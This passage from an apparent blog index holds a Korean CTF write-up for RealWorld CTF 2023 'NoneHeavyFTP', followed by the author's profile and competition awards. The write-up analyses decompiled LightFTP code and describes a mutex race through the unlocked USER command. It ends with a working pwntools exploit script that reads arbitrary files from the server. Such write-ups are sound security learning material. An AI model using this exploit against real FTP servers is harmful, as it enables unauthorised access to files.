unavailable.\\r\\n\u0026#34;, 0x24uLL, 0x4000) \u0026gt;= 0; } else { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;150 File status okay; about to open data connection.\\r\\n\u0026#34;, 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\u0026#34; RETR: \u0026#34;, a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v8 = pthread_create(\u0026amp;newthread, 0LL, retr_thread, mutex); mutex[1].__kind = v8; if ( v8 ) { if ( mutex[515].__align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); } else { *(\u0026amp;mutex[1].__align + 1) = newthread; } pthread_mutex_unlock(mutex); return 1LL; } } RETR 명령어가 구현된 함수다. 파일을 읽는데 필요하다.\nvoid *__fastcall retr_thread(__int64 a1) { void *v1; // rbp void *max_size; // r13 int v4; // eax int v5; // r12d char v6; // r14 __int64 v7; // rdi __int64 v8; // rbx __int64 v9; // rax signed __int64 v10; // rax signed __int64 v11; // r14 __int64 v13; // [rsp+18h] [rbp-D0h] int fd; // [rsp+24h] [rbp-C4h] __int64 v15; // [rsp+28h] [rbp-C0h] BYREF struct timespec tp; // [rsp+30h] [rbp-B8h] BYREF __pthread_unwind_buf_t buf; // [rsp+40h] [rbp-A8h] BYREF buf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock((pthread_mutex_t *)a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026amp;buf, 0) ) { cleanup_handler((pthread_mutex_t *)a1); __pthread_unwind_next(\u0026amp;buf); } __pthread_register_cancel(\u0026amp;buf); v15 = 0LL; clock_gettime(1, \u0026amp;tp); v1 = malloc((size_t)\u0026amp;_data_start); if ( !v1 ) { *(_DWORD *)(a1 + 80) = -1; goto LABEL_26; } fd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026amp;v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u0026gt; \u0026amp;_data_start ) max_size = \u0026amp;_data_start; } else { max_size = \u0026amp;_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; if ( v4 != -1 ) { v6 = 0; if ( *(_QWORD *)(a1 + 104) == lseek64(v4, *(_QWORD *)(a1 + 104), 0) ) { if ( *(_DWORD *)(a1 + 60) ) { v13 = 0LL; v6 = 1; } else { v8 = 0LL; do { v10 = read(v5, v1, (size_t)max_size); v11 = v10; if ( !v10 ) break; if ( v10 \u0026gt;= 0 ) { v9 = v15 ? gnutls_record_send() : send(fd, v1, v10, 0x4000); if ( v11 == v9 ) continue; } v13 = v8; v6 = 0; goto LABEL_41; v8 += v11; } while ( !*(_DWORD *)(a1 + 60) ); v13 = v8; v6 = 1; } LABEL_41: clock_gettime(1, \u0026amp;tp); *(_QWORD *)(a1 + 20616) += v13; ++*(_QWORD *)(a1 + 20632); __snprintf_chk( (char *)v1, (__int64)max_size, 1LL, (__int64)\u0026amp;_data_start, \u0026#34; RETR complete. %zd bytes (%f MBytes) total sent in %f seconds (%f MBytes/s)\u0026#34;); writelogentry(a1, (__int64)v1, (__int64)\u0026#34;\u0026#34;); } close(v5); *(_DWORD *)(a1 + 0x50) = -1; free(v1); v7 = *(_QWORD *)(a1 + 0x5078); if ( !*(_DWORD *)(a1 + 0x3C) \u0026amp;\u0026amp; v6 ) { if ( !v7 ) { send(*(_DWORD *)(a1 + 40), \u0026#34;226 Transfer complete. Closing data connection.\\r\\n\u0026#34;, 0x31uLL, 0x4000); goto LABEL_9; } goto LABEL_8; } LABEL_7: if ( !*(_QWORD *)(a1 + 0x5078) ) { send(*(_DWORD *)(a1 + 40), \u0026#34;426 Connection closed; transfer aborted.\\r\\n\u0026#34;, 0x2AuLL, 0x4000); goto LABEL_9; } LABEL_8: gnutls_record_send(); LABEL_9: close(fd); *(_DWORD *)(a1 + 44) = -1; goto LABEL_10; } } LABEL_6: *(_DWORD *)(a1 + 80) = -1; free(v1); if ( fd != -1 ) goto LABEL_7; LABEL_26: if ( *(_QWORD *)(a1 + 20600) ) gnutls_record_send(); else send(*(_DWORD *)(a1 + 40), \u0026#34;451 Requested action aborted. Local error in processing.\\r\\n\u0026#34;, 0x3AuLL, 0x4000); LABEL_10: if ( v15 ) { gnutls_bye(); gnutls_deinit(); } *(_DWORD *)(a1 + 56) = -1; __pthread_unregister_cancel(\u0026amp;buf); pthread_mutex_unlock((pthread_mutex_t *)a1); return 0LL; } 쓰레드로 돌아간다. 다른 함수랑 비슷하게 mutex 걸고 간다. 파일을 읽고 datasocket으로 보내준다.\nftp_effective_path 함수는 소스코드를 읽으면서 분석했다.\nint ftp_normalize_path(char* path, size_t npath_len, char* npath) { char* p0; size_t node_len; int status = 1; pftp_path_node nodes = NULL, newnode; if ((path == NULL) || (npath == NULL) || (npath_len \u0026lt; 2)) return 0; if (*path == \u0026#39;/\u0026#39;) { *npath = \u0026#39;/\u0026#39;; ++path; ++npath; --npath_len; } p0 = path; while (*path != 0) { while ((*path != \u0026#39;/\u0026#39;) \u0026amp;\u0026amp; (*path != \u0026#39;\\0\u0026#39;)) ++path; node_len = path - p0; while (node_len \u0026gt; 0) { /* we have a \u0026#34;this dir\u0026#34; sign: just skip it */ if (strncmp(p0, \u0026#34;.\u0026#34;, node_len) == 0) break; if (strncmp(p0, \u0026#34;..\u0026#34;, node_len) == 0) { /* we have a \u0026#34;dir-up\u0026#34; sign: unlink and free prev node */ if (nodes) { newnode = nodes-\u0026gt;prev; free(nodes); if (newnode) newnode-\u0026gt;next = NULL; nodes = newnode; } } else { newnode = x_malloc(sizeof(ftp_path_node)); newnode-\u0026gt;value = p0; newnode-\u0026gt;length = node_len; newnode-\u0026gt;next = NULL; newnode-\u0026gt;prev = nodes; if (nodes) nodes-\u0026gt;next = newnode; nodes = newnode; } break; } if (*path != 0) ++path; p0 = path; } /* return to head */ newnode = nodes; while (newnode) { nodes = newnode; newnode = newnode-\u0026gt;prev; } while (nodes) { if (npath_len \u0026lt; nodes-\u0026gt;length + 1) { status = 0; break; } strncpy(npath, nodes-\u0026gt;value, nodes-\u0026gt;length); npath += nodes-\u0026gt;length; *npath = \u0026#39;/\u0026#39;; ++npath; npath_len -= nodes-\u0026gt;length + 1; newnode = nodes; nodes = newnode-\u0026gt;next; free(newnode); } /* free the remaining nodes in case of break */ while (nodes) { newnode = nodes; nodes = newnode-\u0026gt;next; free(newnode); } if ((npath_len == 0) || (status == 0)) return 0; *npath = \u0026#39;\\0\u0026#39;; return 1; } int ftp_effective_path(char *root_path, char *current_path, char *file_path, size_t result_size, char *result) { char path[PATH_MAX*2], normalized_path[PATH_MAX]; int status; size_t len; memset(result, 0, result_size); if (file_path == NULL) file_path = \u0026#34;\u0026#34;; if (*file_path == \u0026#39;/\u0026#39;) { status = ftp_normalize_path(file_path, PATH_MAX, normalized_path); } else { snprintf(path, PATH_MAX*2, \u0026#34;%s/%s\u0026#34;, current_path, file_path); status = ftp_normalize_path(path, PATH_MAX, normalized_path); } if (status == 0) return 0; snprintf(path, PATH_MAX*2, \u0026#34;%s/%s\u0026#34;, root_path, normalized_path); status = ftp_normalize_path(path, result_size, result); /* delete last slash */ len = strlen(result); if (len \u0026gt;= 2) { if (result[len-1] == \u0026#39;/\u0026#39;) result[len-1] = \u0026#39;\\0\u0026#39;; } return status; } 기본적으로 root path와 file path를 마지막에 붙여준다. ..이나 .같은 상대주소 처리도 제대로 구현되어있다.\n분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.\ntypedef struct _FTPCONTEXT { pthread_mutex_t MTLock; SOCKET ControlSocket; SOCKET DataSocket; pthread_t WorkerThreadId; /* * WorkerThreadValid is output of pthread_create * therefore zero is VALID indicator and -1 is invalid. */ int WorkerThreadValid; int WorkerThreadAbort; in_addr_t ServerIPv4; in_addr_t ClientIPv4; in_addr_t DataIPv4; in_port_t DataPort; int File; int Mode; int Access; int SessionID; int DataProtectionLevel; off_t RestPoint; uint64_t BlockSize; char CurrentDir[PATH_MAX]; char RootDir[PATH_MAX]; char RnFrom[PATH_MAX]; char FileName[2*PATH_MAX]; gnutls_session_t TLS_session; SESSION_STATS Stats; } FTPCONTEXT, *PFTPCONTEXT; 함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다. File이나, Access, Mode같은 필드들이 있었다.\nExploitation int ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u0026gt;Access = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \u0026#34; USER: \u0026#34;, (char *)params); snprintf(context-\u0026gt;FileName, sizeof(context-\u0026gt;FileName), \u0026#34;331 User %s OK. Password required\\r\\n\u0026#34;, params); sendstring(context, context-\u0026gt;FileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u0026gt;FileName, params); return 1; } ftpUSER에서 FileName이 덮힌다. ftp_effective_path에서\nsnprintf(path, PATH_MAX*2, \u0026#34;%s/%s\u0026#34;, root_path, normalized_path); 위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다.\nftp_effective_path(context-\u0026gt;RootDir, context-\u0026gt;CurrentDir, params, sizeof(context-\u0026gt;FileName), context-\u0026gt;FileName); while (stat(context-\u0026gt;FileName, \u0026amp;filestats) == 0) { if ( !S_ISDIR(filestats.st_mode) ) break; sendstring(context, interm150); writelogentry(context, \u0026#34; MLSD-LIST \u0026#34;, (char *)params); context-\u0026gt;WorkerThreadAbort = 0; pthread_mutex_lock(\u0026amp;context-\u0026gt;MTLock); ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context-\u0026gt;FileName을 체크하는 것을 알 수 있다. 이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다. 그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다. 그때는 왜 lock 되어있는데 값이 바뀌는지 궁금했지만, 그냥 되길래 익스플로잇 코드를 짰었다.\nmutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다. 만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.\nint ftpUSER(PFTPCONTEXT context, const char *params) { if ( params == NULL ) return sendstring(context, error501); context-\u0026gt;Access = FTP_ACCESS_NOT_LOGGED_IN; writelogentry(context, \u0026#34; USER: \u0026#34;, (char *)params); snprintf(context-\u0026gt;FileName, sizeof(context-\u0026gt;FileName), \u0026#34;331 User %s OK. Password required\\r\\n\u0026#34;, params); sendstring(context, context-\u0026gt;FileName); /* Save login name to FileName for the next PASS command */ strcpy(context-\u0026gt;FileName, params); return 1; } ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.\nftp_effective_path((__int64)(\u0026amp;mutex[105].__align + 2), (__int64)\u0026amp;mutex[3], a2, 0x2000uLL, \u0026amp;mutex[310].__size[8]); v4 = stat64(\u0026amp;mutex[310].__size[8], \u0026amp;v9); // get stat of file align = mutex[515].__align; if ( !v4 \u0026amp;\u0026amp; (v9.st_mode \u0026amp; 0xF000) == 0x4000 ) { if ( align ) gnutls_record_send(); else send(mutex[1].__lock, \u0026#34;150 File status okay; about to open data connection.\\r\\n\u0026#34;, 0x36uLL, 0x4000); writelogentry((__int64)mutex, (__int64)\u0026#34; MLSD-LIST \u0026#34;, (__int64)a2); mutex[1].__spins = 0; pthread_mutex_lock(mutex); v7 = pthread_create(\u0026amp;newthread, 0LL, (void *(*)(void *))mlsd_thread, mutex); mlsd_thread를 호출한다. 그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.\nbuf.__pad[4] = (void *)__readfsqword(0x28u); pthread_mutex_lock(a1); if ( __sigsetjmp((struct __jmp_buf_tag *)\u0026amp;buf, 0) ) { cleanup_handler(a1); __pthread_unwind_next(\u0026amp;buf); } v1 = 0; __pthread_register_cancel(\u0026amp;buf); mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.\n*(_QWORD *)fd = (unsigned int)create_datasocket(a1); if ( *(_DWORD *)fd != -1 ) { if ( !a1[515].__align || (unsigned int)ftp_init_tls_session(\u0026amp;fd[4], *(unsigned int *)fd, 0) ) { v2 = opendir(\u0026amp;a1[310].__size[8]); // open dir if ( v2 ) { do { v3 = readdir64(v2); if ( !v3 ) break; v1 = mlsd_sub(\u0026amp;a1[310].__align + 1, *(unsigned int *)fd, *(_QWORD *)\u0026amp;fd[4], v3); if ( !v1 ) break; } while ( !a1[1].__spins ); closedir(v2); } mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다. 그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.\nfd로 결과를 보내준다. 이걸로 flag의 이름을 알 수 있다.\nfd = create_datasocket(a1); if ( fd != -1 ) { if ( *(_QWORD *)(a1 + 20600) ) { if ( !(unsigned int)ftp_init_tls_session(\u0026amp;v15, fd, 0) ) goto LABEL_6; max_size = (void *)gnutls_record_get_max_size(v15); if ( max_size \u0026gt; \u0026amp;_data_start ) max_size = \u0026amp;_data_start; } else { max_size = \u0026amp;_data_start; } v4 = open64((const char *)(a1 + 12408), 0); *(_DWORD *)(a1 + 80) = v4; v5 = v4; 이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다. 당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.\nSOCKET create_datasocket(PFTPCONTEXT context) { SOCKET\tclientsocket = INVALID_SOCKET; struct sockaddr_in\tladdr; socklen_t\tasz; memset(\u0026amp;laddr, 0, sizeof(laddr)); switch ( context-\u0026gt;Mode ) { case MODE_NORMAL: clientsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); context-\u0026gt;DataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; laddr.sin_family = AF_INET; laddr.sin_port = context-\u0026gt;DataPort; laddr.sin_addr.s_addr = context-\u0026gt;DataIPv4; if ( connect(clientsocket, (const struct sockaddr *)\u0026amp;laddr, sizeof(laddr)) == -1 ) { close(clientsocket); return INVALID_SOCKET; } break; case MODE_PASSIVE: asz = sizeof(laddr); clientsocket = accept(context-\u0026gt;DataSocket, (struct sockaddr *)\u0026amp;laddr, \u0026amp;asz); close(context-\u0026gt;DataSocket); context-\u0026gt;DataSocket = clientsocket; if ( clientsocket == INVALID_SOCKET ) return INVALID_SOCKET; context-\u0026gt;DataIPv4 = 0; context-\u0026gt;DataPort = 0; context-\u0026gt;Mode = MODE_NORMAL; break; default: return INVALID_SOCKET; } return clientsocket; } PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.\nExploit script from pwn import * sa = lambda x,y : p.sendafter(x,y) s = lambda x : p.send(x) rvu = lambda x : p.recvuntil(x) local =False if local==True: ip = \u0026#39;127.0.0.1\u0026#39; mip = b\u0026#39;127,0,0,1\u0026#39; else : ip = \u0026#39;47.89.253.219\u0026#39; mip = b\u0026#39;0,0,0,0\u0026#39; p = remote(ip,2121) context.log_level=\u0026#39;debug\u0026#39; pay = b\u0026#39;USER anonymous\\r\\n\u0026#39; sa(b\u0026#39;ready\u0026#39;,pay) pay = b\u0026#39;PASS AAAAA\\r\\n\u0026#39; sa(b\u0026#39; OK\u0026#39;,pay) pay = b\u0026#39;PASV \\r\\n\u0026#39; sa(b\u0026#39;logged in\u0026#39;,pay) pay = b\u0026#39;MLSD /\\r\\n\u0026#39; sa(b\u0026#39;Passive\u0026#39;,pay) rvu(mip+b\u0026#39;,\u0026#39;) recv = rvu(b\u0026#39;)\u0026#39;)[:-1].split(b\u0026#39;,\u0026#39;) recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\u0026#34;nc {ip} {port}\u0026#34;) s(b\u0026#39;USER /\\r\\n\u0026#39;) print(\u0026#34;flag name : \u0026#34;,end=\u0026#39;\u0026#39;) flag = input() s(b\u0026#39;USER anonymous\\r\\n\u0026#39;) sa(b\u0026#39; OK\u0026#39;,b\u0026#39;PASS AAAAA\\r\\n\u0026#39;) sa(b\u0026#39;logged in\u0026#39;,b\u0026#39;PASV \\r\\n\u0026#39;) rvu(mip+b\u0026#39;,\u0026#39;) recv = rvu(b\u0026#39;)\u0026#39;)[:-1].split(b\u0026#39;,\u0026#39;) recv = [int(x) for x in recv] port = recv[0] * 256 + recv[1] success(f\u0026#34;nc {ip} {port}\u0026#34;) flag = \u0026#34;/\u0026#34;+flag pay = b\u0026#39;RETR /hello.txt\\r\\n\u0026#39; s(pay) s(f\u0026#39;USER {flag[:-1]}\\r\\n\u0026#39;) p.interactive() nc로 직접 접속해줘야된다. flag 이름 넣어주고 다른 포트로 다시 접속하면 된다. ","permalink":"https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/","summary":"NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\nFROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update \u0026amp;\u0026amp;\\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ \u0026amp;\u0026amp;\\ echo \u0026#34;hello from LightFTP\u0026#34; \u0026gt;\u0026gt; /server/data/hello.txt \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip \u0026amp;\u0026amp;\\ unzip LightFTP-2.2.zip \u0026amp;\u0026amp;\\ cd LightFTP-2.2/Source/Release \u0026amp;\u0026amp;\\ make \u0026amp;\u0026amp;\\ cp -a .","title":"RealWorld CTF 2023 - NoneHeavyFTP"},{"content":"Profile 맹서현 / 2006.02.17\nOrganization Sunrin Internet High School InfoSec 117th Layer7 Hacking Club KITRI BoB 12th Vulnerability Analysis cat :flag_kr: CTF team DeadSec CTF team Activity 선린인터넷고등학교 SW 영재원 (2020.04 ~ 2020.11) 선린인터넷고등학교 SW 영재원 (2021.04 ~ 2021.11) 현대오토에버 화이트해커 양성교육 (2022.07 ~ 2022.11) KITRI BoB 12th Vulnerability Analysis (2023.07 ~ 2024.03) CTF \u0026amp; Award 2024\n18th, Google CTF Quals 미래기술연구소 장학생 선정 (₩1,000,000) 2nd, Hspace Cyberwar pwn (₩80,000) 6th, DEFCON 2024 Quals (Team Cold Fusion) 7th, LINE CTF 2024 (Team Cold Fusion) Whitehat 10, Best of the Best (₩3,000,000) 1st, Hspace Cyberwar pwn (₩160,000) 1st, Cyber Apocalypse 2024: Hacker Royale (Team Friendly Maltese Citizens) 2023\n2nd, 선린 고등해커 페스티벌 2023 (Team 냥코) 2nd, Dreamhack KAPO, KAIST-POSTECH CTF 2023 1st, ABB CTF 2023 (₩1,000,000) (Team 냥코대전쟁) 1st, Cyber Guardians CTF 2023 (Team 냥코대전쟁) 2nd, WITHCON, Whitehat Contest Junior 2023 (₩4,000,000) (Team 뿡빵띠) 3rd, WACON, Whitehat Attack Contest Junior 2023 (₩2,000,000) (Team 옆집 서현이 때문에 어느샌가 블랙해커로 타락한 사연) 4th, YISF CTF 2023 (₩500,000) 3rd, KOSPO CTF 2023 (₩500,000) (Team cats save the world) 3rd, CCE, Cyber Conflict Exercise Junior 2023 (₩1,000,000) (Team 가끔씩 툭하고 어셈블리어로 부끄러워하는 옆자리의 서현 군) 2nd, JBU CTF 2023 (₩100,000) (Team 달) 8th, Codegate Junior 2023 1st, 선린 모의해킹방어대회 2023 2022\n2nd, 선린 고등해커 페스티벌 2022 (Team Sechack) 2nd, 현대오토에버 화이트해커 경진대회 2022 (₩1,000,000) 2nd, Cyber Guardians CTF 2022 3rd, LOGCON CTF 2022 4th, Dreamhack Christmas CTF 2022 5th, Whitehat Contest Junior 2022 5th, CCE, Cyber Conflict Exercise Junior 2022 한림장학재단 장학생 선정 (₩1,000,000) 2021\n창의적 산출물 발표회 금상 2021 SW 영재 창작대회 장려상 2021 2020\n창의적 산출물 발표회 우수상 2020 ","permalink":"https://msh1307.kr/about/","summary":"About me","title":"About me"}]